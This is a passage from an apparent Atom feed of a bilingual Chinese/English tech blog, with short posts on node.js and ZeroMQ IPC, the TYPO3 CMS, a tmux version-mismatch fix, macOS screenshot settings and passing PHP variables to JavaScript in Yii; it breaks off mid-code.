&lt;li&gt;Ruby: read_partial, read_nonblock  &lt;/li&gt;
&lt;li&gt;POSIX: aio_read  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;POSIX (Portable Operating System Interface X), IEEE 103, 在各種 UNIX system 上 API 相互關聯的標準  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;Ch6.4 node.js&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Introduction  &lt;ul&gt;
&lt;li&gt;JavaScript  &lt;/li&gt;
&lt;li&gt;Event Driven  &lt;/li&gt;
&lt;li&gt;Non Blocking Framework  &lt;/li&gt;
&lt;li&gt;Google Chrome v8 Engine  &lt;/li&gt;
&lt;li&gt;Call Back Sytle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;優點  &lt;ul&gt;
&lt;li&gt;可以很容易實做一個 Web Server  &lt;/li&gt;
&lt;li&gt;採用 epoll (Linux) 和 kqueue (FreeBSD), 可因應較多的 connection  &lt;/li&gt;
&lt;li&gt;採用 HTTP1.1 的 keep-alive 方式，同個 client 的 connection 是可以重複使用的，降低 TCP Socket connection 重複連接造成的成本。  &lt;/li&gt;
&lt;li&gt;Event Driven 降低每個 connection 消耗的資源  &lt;/li&gt;
&lt;li&gt;同一個 client 對同一個 Server 進行頻繁的連接而且連接數非常大的時候，使用 node.js 非常適合(ex: 網路聊天程式)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他 Event Driven Model  &lt;ul&gt;
&lt;li&gt;Ruby: EventMachine, Rev  &lt;/li&gt;
&lt;li&gt;Python: Twisted  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="http://www.debian.org/releases/sid/"&gt;sid&lt;/a&gt; - The unstable distribution of Debian  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;Ch6.5 ZeroMQ&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Threads  &lt;ul&gt;
&lt;li&gt;在同一個 Process 中，所以只能在一台電腦上完成所有工作。  &lt;ul&gt;
&lt;li&gt;一台電腦的核心有限，遇到大規模的 concurrent 還是會有瓶頸。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;共享 Memory  &lt;ul&gt;
&lt;li&gt;優點: data 不需要進行複製  &lt;/li&gt;
&lt;li&gt;缺點: thread 是獨立運作的，但因為資料共享，所以可能會更改到其他 thread 正在進行操作的資料，造成非常難以發現的 bug  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Processes  &lt;ul&gt;
&lt;li&gt;優點: 不必侷限在一台電腦上進行工作  &lt;/li&gt;
&lt;li&gt;缺點: 無法共享 Memory，必須進行資料複製以達到共享，對性能造成不利影響。  &lt;/li&gt;
&lt;li&gt;由於 Memory 無法共享，所以 process 之間必須進行溝通，還得考慮到排他性。  &lt;/li&gt;
&lt;li&gt;Process Communication  &lt;ul&gt;
&lt;li&gt;Pipe  &lt;ul&gt;
&lt;li&gt;只能在有 parent, sibling 或可共享 File Descriptor 的 process 之間使用  &lt;/li&gt;
&lt;li&gt;在所屬的 Process 結束後，會自動被銷毀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SysV IPC (Unix System V Inter Process Communication)  &lt;ul&gt;
&lt;li&gt;Message Queue  &lt;ul&gt;
&lt;li&gt;可以保存寫入訊息的長度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Semaphore  &lt;ul&gt;
&lt;li&gt;可以設定某個 Resource 最大的同時訪問量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shared Memory  &lt;/li&gt;
&lt;li&gt;溝通完後必須進行顯示的銷毀，否則會在系統中留下 Garbage，造成 Memory Leak  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ man svipc&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Socket  &lt;ul&gt;
&lt;li&gt;在 Process 結束後會由 OS 自動釋放，無需擔心 Memory Leak  &lt;/li&gt;
&lt;li&gt;TCP Socket  &lt;ul&gt;
&lt;li&gt;基於 IP, 可在不同的電腦之間傳遞訊息  &lt;/li&gt;
&lt;li&gt;Connection  &lt;/li&gt;
&lt;li&gt;Realiable  &lt;/li&gt;
&lt;li&gt;Datastream: 不會保存寫入訊息的長度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UDP Socket  &lt;ul&gt;
&lt;li&gt;基於 IP, 可在不同的電腦之間傳遞訊息  &lt;/li&gt;
&lt;li&gt;Connectionless  &lt;/li&gt;
&lt;li&gt;Unrealiable  &lt;/li&gt;
&lt;li&gt;Datagram: 會保存寫入訊息的長度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UNIX Socket  &lt;ul&gt;
&lt;li&gt;非基於 IP, 只能在同一台電腦上傳遞訊息  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ZeroMQ (zmq)  &lt;ul&gt;
&lt;li&gt;為了解決 Process 溝通之間，使用 Socket 進行委派的易用性不夠理想而誕生  &lt;/li&gt;
&lt;li&gt;支援跨平台(Linux, Mac OS X, Windows)之間進行溝通  &lt;/li&gt;
&lt;li&gt;支援多種程式語言  &lt;/li&gt;
&lt;li&gt;提供了多種底層通信方法，可透過 API 使用  &lt;ul&gt;
&lt;li&gt;tcp  &lt;ul&gt;
&lt;li&gt;使用 hostname 和 port 進行連接  &lt;/li&gt;
&lt;li&gt;ZeroMQ 不存在身份認證的安全機制，所以不要在網路上公佈自己機器 ZeroMQ 的 port 號  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Inter-process_communication"&gt;ipc&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;同一台電腦上的 process 之間溝通  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;inproc  &lt;ul&gt;
&lt;li&gt;同一個 process 之間的 thread 溝通  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;multicast  &lt;ul&gt;
&lt;li&gt;一對多電腦的訊息傳遞  &lt;/li&gt;
&lt;li&gt;然而有些 router 是禁止 multicast 的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;多種 connection model  &lt;ul&gt;
&lt;li&gt;REQ/REP (Request/Reply)  &lt;ul&gt;
&lt;li&gt;雙向  &lt;/li&gt;
&lt;li&gt;client 發 request, server 回 reply  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PUB/SUB (Publish/Subscribe)  &lt;ul&gt;
&lt;li&gt;單向  &lt;/li&gt;
&lt;li&gt;Server publish 訊息給有 subscribe 過該 Sever 的 Client  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PUSH/PULL  &lt;ul&gt;
&lt;li&gt;單向  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PAIR  &lt;ul&gt;
&lt;li&gt;雙向, 一對一  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其標準 API 是以 C 撰寫的  &lt;/li&gt;
&lt;li&gt;啓動順序自由：一般必須先啓動 Server 端，但在 ZeroMQ，先啓動 Client 端也是可以的。如果 Client 發現 Server 端未啓動的話，便會進入待機狀態，等待 Server 開啓服務。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;現在已是多核時代，撰寫程式的時候更應該考慮使用多核心來提高效能，而不是停留在以前單核心時代的撰寫方式。  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="Review"></category><category term="NoSQL"></category><category term="Big Data"></category><category term="RDBMS"></category></entry><entry><title>TYPO3 CMS</title><link href="https://blog.m157q.tw/posts/2014/03/03/typo3-cms/" rel="alternate"></link><published>2015-10-26T15:10:00+08:00</published><updated>2015-10-26T15:10:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-03-03:posts/2014/03/03/typo3-cms/</id><summary type="html">&lt;p&gt;Introduction to &lt;a href="https://typo3.org/"&gt;TYPO3&lt;/a&gt; by &lt;a href="https://twitter.com/keinerweiss"&gt;Rüdiger Marwein&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Why name &lt;a href="https://typo3.org/"&gt;TYPO3&lt;/a&gt;?  &lt;ul&gt;
&lt;li&gt;Because the author deleted the project unintentionally &lt;strong&gt;TWICE&lt;/strong&gt;, so it called &lt;strong&gt;TYPO3&lt;/strong&gt; .  &lt;/li&gt;
&lt;li&gt;Developed by PHP.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TYPO3 Association  &lt;ul&gt;
&lt;li&gt;Enables developers to contribute  &lt;/li&gt;
&lt;li&gt;Ensures stable release cycle  &lt;/li&gt;
&lt;li&gt;Provides certification program  &lt;/li&gt;
&lt;li&gt;Organizes community events  &lt;ul&gt;
&lt;li&gt;TYPO3 conference  &lt;/li&gt;
&lt;li&gt;T3BOARD  &lt;/li&gt;
&lt;li&gt;Developer Day  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Open Source Community  &lt;ul&gt;
&lt;li&gt;Strongest participation concentrated in Germany, Switzerland, Austria  &lt;/li&gt;
&lt;li&gt;Global approach  &lt;ul&gt;
&lt;li&gt;software available in 50+ languages  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content Management System (CMS) of TYPO3  &lt;ul&gt;
&lt;li&gt;To separate content from layout  &lt;/li&gt;
&lt;li&gt;6000+ extensions in the repo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Skill-levels for TYPO3 CMS  &lt;ul&gt;
&lt;li&gt;Integrator  &lt;ul&gt;
&lt;li&gt;Setup, configuration management  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Extension Developer  &lt;ul&gt;
&lt;li&gt;Create extensions by using the framework  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Editor  &lt;ul&gt;
&lt;li&gt;Create and edit content  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TypoScript  &lt;ul&gt;
&lt;li&gt;Users Can change configuration without write any PHP code.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Enterprise CMS  &lt;ul&gt;
&lt;li&gt;Unlimited users &amp;amp; groups  &lt;/li&gt;
&lt;li&gt;Multiple clients in one system  &lt;/li&gt;
&lt;li&gt;Multiple domains manageable  &lt;/li&gt;
&lt;li&gt;Flexible configuration, even for core features.(by TypoScript)  &lt;/li&gt;
&lt;li&gt;Extensibility  &lt;/li&gt;
&lt;li&gt;Inexpensive upgrade &amp;amp; migration  &lt;ul&gt;
&lt;li&gt;use symbolic link  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Release schedule  &lt;/li&gt;
&lt;li&gt;Security-team &amp;amp; -workflow for core + extensions  &lt;ul&gt;
&lt;li&gt;If you find a security hole, you can email the Security team, the team will deal with it.  &lt;/li&gt;
&lt;li&gt;A big issue will be solved in 24 hours as soon as possible and release an update.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Core Features  &lt;ul&gt;
&lt;li&gt;Enable / Disable pages or content  &lt;/li&gt;
&lt;li&gt;Time based hide / show  &lt;/li&gt;
&lt;li&gt;Global &amp;amp; local content  &lt;ul&gt;
&lt;li&gt;Referencing content  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Many content element types  &lt;ul&gt;
&lt;li&gt;Text / image combinations  &lt;/li&gt;
&lt;li&gt;Menus &amp;amp; link lists  &lt;/li&gt;
&lt;li&gt;Multi-column content  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Media management  &lt;/li&gt;
&lt;li&gt;Versioning  &lt;/li&gt;
&lt;li&gt;HMAC-based security  &lt;/li&gt;
&lt;li&gt;Extension concept  &lt;/li&gt;
&lt;li&gt;Drag &amp;amp; Drop  &lt;/li&gt;
&lt;li&gt;Access / feature restrictions  &lt;/li&gt;
&lt;li&gt;Protected areas via frontend login  &lt;/li&gt;
&lt;li&gt;High-traffic - intensive caching  &lt;ul&gt;
&lt;li&gt;File system, Database, memory, NoSQL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Output fully configurable  &lt;ul&gt;
&lt;li&gt;Website, PDF, Image, XML Interface, ...  &lt;/li&gt;
&lt;li&gt;Single source publishing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DB-record relations  &lt;ul&gt;
&lt;li&gt;1:1, 1:n, n:m  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Valid HTML5 output  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Features via extensions  &lt;ul&gt;
&lt;li&gt;Press / News releases  &lt;/li&gt;
&lt;li&gt;Newsletter  &lt;/li&gt;
&lt;li&gt;Search engine optimization  &lt;/li&gt;
&lt;li&gt;Image galleries  &lt;/li&gt;
&lt;li&gt;Readable URLs  &lt;/li&gt;
&lt;li&gt;Address database  &lt;/li&gt;
&lt;li&gt;Forum  &lt;/li&gt;
&lt;li&gt;Frontend user registration  &lt;/li&gt;
&lt;li&gt;Mail forms  &lt;/li&gt;
&lt;li&gt;FAQ  &lt;/li&gt;
&lt;li&gt;Online-Shop  &lt;/li&gt;
&lt;li&gt;Google Maps  &lt;/li&gt;
&lt;li&gt;Search  &lt;/li&gt;
&lt;li&gt;Web Analytics  &lt;/li&gt;
&lt;li&gt;Developer support  &lt;ul&gt;
&lt;li&gt;Extension Builder  &lt;ul&gt;
&lt;li&gt;You can use UML diagram to generate Extensions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protocols  &lt;/li&gt;
&lt;li&gt;Libraries  &lt;/li&gt;
&lt;li&gt;PHP unit integration  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Current Work  &lt;ul&gt;
&lt;li&gt;Code cleanup with version 4.7 (4.2012)  &lt;ul&gt;
&lt;li&gt;Many extensions known to not work without rework.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rebased for version 6.0 (11.2012)  &lt;ul&gt;
&lt;li&gt;Partly breaks backward compatibility  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why?  &lt;ul&gt;
&lt;li&gt;For code refactoring  &lt;/li&gt;
&lt;li&gt;Removed tons of legacy code  &lt;/li&gt;
&lt;li&gt;Cleanup outdated file structure, class and function naming  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.sitepoint.com/autoloading-and-the-psr-0-standard/"&gt;PSR-0&lt;/a&gt; conformity  &lt;/li&gt;
&lt;li&gt;Replace prototype with jQuery  &lt;/li&gt;
&lt;li&gt;Use new "Extbase" framework in backend as well  &lt;/li&gt;
&lt;li&gt;Final goal: merge in Flow framework -&amp;gt; product interoperability  &lt;/li&gt;
&lt;li&gt;Backend layout / usability enhancements  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Appendix&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://code.google.com/p/gource/"&gt;gource - software version control visualization&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="PHP"></category><category term="Open Source"></category><category term="CMS"></category><category term="TYPO3"></category></entry><entry><title>Protocol version mismatch error in tmux</title><link href="https://blog.m157q.tw/posts/2014/02/27/protocol-version-mismatch-error-in-tmux/" rel="alternate"></link><published>2015-10-26T13:28:00+08:00</published><updated>2015-10-26T13:28:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/protocol-version-mismatch-error-in-tmux/</id><summary type="html">&lt;p&gt;今天打 &lt;code&gt;$ tmux attach&lt;/code&gt; 之後  &lt;/p&gt;
&lt;p&gt;竟然噴了錯誤訊息 &lt;code&gt;protocol version mismatch (client 8, server 7)&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;以前完全沒看過  &lt;/p&gt;
&lt;p&gt;只好丟去 Google  &lt;/p&gt;
&lt;p&gt;第一個解法是 &lt;strong&gt;強行 attach tmux&lt;/strong&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pgrep tmux  
$ /proc/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;tmuxpid&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/exe attach  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;但執行後發現會噴 Permission Denied. 失敗  &lt;/p&gt;
&lt;p&gt;第二個解法是 &lt;strong&gt;把 tmux 砍掉重開&lt;/strong&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pgrep tmux  
$ &lt;span class="nb"&gt;kill&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;tmuxpid&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然後重開 tmux 就行了  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;References&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bugs.launchpad.net/byobu/+bug/1174724"&gt;protocol version mismatch (client 7, server 6)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://plus.google.com/110139418387705691470/posts/BebrBSXMkBp"&gt;https://plus.google.com/110139418387705691470/posts/BebrBSXMkBp&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.longwin.com.tw/2013/11/tmux-protocol-version-mismatch-fix-2013/"&gt;Tmux 出現 protocol version mismatch 解法&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="tmux"></category></entry><entry><title>Hootsuite - Social Media Management</title><link href="https://blog.m157q.tw/posts/2014/02/27/hootsuite-social-media-management/" rel="alternate"></link><published>2015-10-26T15:13:00+08:00</published><updated>2015-10-26T15:13:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/hootsuite-social-media-management/</id><summary type="html">&lt;p&gt;&lt;a href="https://hootsuite.com/"&gt;Social Media Management Dashboard - Hootsuite&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;聽說可以整合許多 SMS 一次發布訊息  &lt;/p&gt;
&lt;p&gt;然後介面長得有點像 Trello  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;2015.10.26 後記&lt;/h2&gt;
&lt;p&gt;當時是因為 Apua 在 PyCon 需要在 SMS 上面發文宣得知 &lt;code&gt;Hootsuite&lt;/code&gt;&lt;br /&gt;
最近得知另外一個也在做相同功能的網站是 &lt;a href="https://buffer.com/"&gt;Buffer - A Smarter Way to Share on Social Media&lt;/a&gt;  &lt;/p&gt;</summary><category term="SMS"></category><category term="Hootsuite"></category></entry><entry><title>Interesting JavaScript online encoder</title><link href="https://blog.m157q.tw/posts/2014/02/27/interesting-javascript-online-encoder/" rel="alternate"></link><published>2015-10-26T14:02:00+08:00</published><updated>2015-10-26T14:02:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/interesting-javascript-online-encoder/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href="http://utf-8.jp/public/jjencode.html"&gt;jjencode&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://utf-8.jp/public/aaencode.html"&gt;aaencode&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="JavaScript"></category></entry><entry><title>Laravel 4 Traditional Chinese Tutorial</title><link href="https://blog.m157q.tw/posts/2014/02/27/laravel-4-traditional-chinese-tutorial/" rel="alternate"></link><published>2015-10-27T22:40:00+08:00</published><updated>2015-10-27T22:40:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/laravel-4-traditional-chinese-tutorial/</id><summary type="html">&lt;p&gt;這個超級年輕又火紅的 PHP Framework 竟然有繁體中文的教學  &lt;/p&gt;
&lt;p&gt;身邊有用過的好像都說還不錯  &lt;/p&gt;
&lt;p&gt;聽說是 RoR like ?  &lt;/p&gt;
&lt;p&gt;稍微瞄了一下 好像還沒看到非常吸引我的地方  &lt;/p&gt;
&lt;p&gt;之後再找時間繼續看  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://kejyun.github.io/Laravel-4-Documentation-Traditional-Chinese/docs/introduction/"&gt;Laravel 4 中文文件&lt;/a&gt;  &lt;/p&gt;</summary><category term="Web"></category><category term="PHP"></category><category term="Laravel"></category><category term="framework"></category></entry><entry><title>修改 Mac 的截圖儲存位置及格式</title><link href="https://blog.m157q.tw/posts/2014/02/27/change-the-default-screenshot-saving-folder-and-format-on-mac/" rel="alternate"></link><published>2014-02-27T14:08:00+08:00</published><updated>2014-02-27T14:08:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/change-the-default-screenshot-saving-folder-and-format-on-mac/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;修改內建截圖的儲存位置  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;$ defaults write com.apple.screencapture location ${directory}&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ killall SystemUIServer&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;修改內建截圖的儲存格式  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;$ defaults write com.apple.screencapture type $type&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;type 有 4 種可選:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;png  &lt;/li&gt;
&lt;li&gt;jpg  &lt;/li&gt;
&lt;li&gt;gif  &lt;/li&gt;
&lt;li&gt;pdf  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h4&gt;Reference&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://my.eoe.cn/sisuer/archive/4711.html"&gt;【Mac技巧】修改Mac系统电脑快捷键截图默认保存路径及修改图片类型&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Mac"></category><category term="Screenshot"></category></entry><entry><title>Pass PHP Variables to JavaScript in Yii</title><link href="https://blog.m157q.tw/posts/2014/02/27/pass-php-variables-to-javascript-in-yii/" rel="alternate"></link><published>2015-10-27T22:40:00+08:00</published><updated>2015-10-27T22:40:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/pass-php-variables-to-javascript-in-yii/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;因為網站需求 想找看看有沒有可以把 PHP 中的變數傳給 JavaScript 使用的方法  &lt;/p&gt;
&lt;p&gt;主要是因為 URL 不想像之前一樣是寫死在 JavaScript 裡面  &lt;/p&gt;
&lt;p&gt;不然之後 URL routing 又改的話 又得重新修改 實在很麻煩  &lt;/p&gt;
&lt;p&gt;想用 &lt;code&gt;Yii::app()-&amp;gt;createAbsoluteUrl('');&lt;/code&gt; 生成該頁面的網址之後  &lt;/p&gt;
&lt;p&gt;再丟給 JavaScript  &lt;/p&gt;
&lt;p&gt;這樣就不用把網址寫死在裡面  &lt;/p&gt;
&lt;p&gt;其實找了有點久 好像沒找比較好的解法  &lt;/p&gt;
&lt;h2&gt;Solution&lt;/h2&gt;
&lt;p&gt;所以最後用了 &lt;a href="http://stackoverflow.com/questions/8912548/in-yii-pass-php-variables-to-javascript"&gt;stackoverflow 上的這篇&lt;/a&gt; 中最底下的回覆  &lt;/p&gt;
&lt;p&gt;但裡面的寫法有一點點小錯誤  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;Yii::app()-&amp;gt;clientScript-&amp;gt;registerScript(&amp;quot;myVarList&amp;quot;,  &lt;/span&gt;
&lt;span class="x"&gt;    &amp;#39;myVarList = jQuery.parseJSON(&amp;#39;.CJSON::encode($myVarList).&amp;#39;);&amp;#39;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;小括號的內層必須再多一對單引號  &lt;/p&gt;
&lt;p&gt;不然 &lt;a href="https://api.jquery.com/jQuery.parseJSON/"&gt;jQuery.parseJSON&lt;/a&gt; 會出錯  &lt;/p&gt;
&lt;p&gt;所以最後寫的 Code 長這樣  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;  
&lt;span class="nv"&gt;$myVar&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;url&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;Yii&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="na"&gt;app&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;createAbsoluteUrl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;module&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/default/list/json/1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;  
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;  &lt;/span&gt;

&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;  
&lt;span class="nx"&gt;Yii&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="na"&gt;app&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;clientScript&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;registerScript&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;myVar = jQuery.parseJSON(&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;CJSON&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="na"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$myVar&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;#39;);&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;EOD&lt;/span&gt;  
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;updateList&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;  
